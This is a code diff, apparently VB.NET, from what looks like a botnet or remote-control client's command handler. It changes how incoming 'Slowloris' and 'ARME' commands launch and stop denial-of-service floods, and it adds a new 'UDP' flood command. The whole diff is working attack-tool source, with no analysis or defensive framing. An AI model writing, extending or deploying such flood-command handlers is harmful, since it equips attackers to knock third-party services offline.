@@ -11,20 +11,30 @@
             Case "Slowloris"
                 Select Case A(1)
                     Case "1"
-                        STV("Slowloris|STOP", "False")
-                        Slowloris.StartSlowloris(A(2), A(3), A(4), A(5))
+                        STV("Flood|STOP", "False")
+                        Slowloris.StartSlowloris(A(2), A(3), A(4), "")
                     Case "2"
-                        STV("Slowloris|STOP", "True")
+                        STV("Flood|STOP", "True")
                 End Select
 
             Case "ARME"
                 Select Case A(1)
                     Case "1"
-                        STV("ARME|STOP", "False")
-                        ARME.StartARME(A(2), A(3), A(4), A(5))
+                        STV("Flood|STOP", "False")
+                        ARME.StartARME(A(2), A(3), A(4), "")
                     Case "2"
-                        STV("ARME|STOP", "True")
+                        STV("Flood|STOP", "True")
                 End Select
+
+            Case "UDP"
+                Select Case A(1)
+                    Case "1"
+                        STV("Flood|STOP", "False")
+                        UDP.StartUDP(A(2), A(3), A(4), A(5))
+                    Case "2"
+                        STV("Flood|STOP", "True")
+                End Select
+
         End Select
 
     End Sub
